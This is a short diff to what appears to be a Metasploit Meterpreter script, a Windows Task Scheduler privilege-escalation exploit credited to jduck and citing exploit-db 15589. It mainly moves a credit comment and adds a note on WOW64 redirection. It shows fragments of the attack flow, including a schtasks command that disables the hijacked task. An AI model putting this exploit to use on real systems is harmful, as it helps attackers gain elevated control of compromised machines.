@@ -10,6 +10,9 @@
 #
 # written by jduck
 #
+# NOTE: Thanks to webDEViL for the information about disable/enable.
+# http://www.exploit-db.com/exploits/15589/
+#
 ##
 
 require 'zlib'
@@ -23,6 +26,12 @@ if session.platform !~ /win32|win64/
 end
 
 if session.sys.config.sysinfo["Architecture"] =~ /wow64/i
+	#
+	# WOW64 Filesystem Redirection prevents us opening the file directly. To make matters
+	# worse, meterpreter/railgun creates things in a new thread, making it much more
+	# difficult to disable via Wow64EnableWow64FsRedirection. Until we can get around this,
+	# offer a workaround and error out.
+	#
 	print_error("Running against via WOW64 is not supported, try using an x64 meterpreter...")
 	raise Rex::Script::Completed
 end
@@ -323,9 +332,6 @@ fd.close
 
 #
 # Run the task :-)
-#
-# NOTE: Thanks to webDEViL for the information about disable/enable.
-# http://www.exploit-db.com/exploits/15589/
 #
 print_status("Disabling the task...")
 exec_schtasks("schtasks.exe /change /tn #{taskname} /disable", "disable the task")
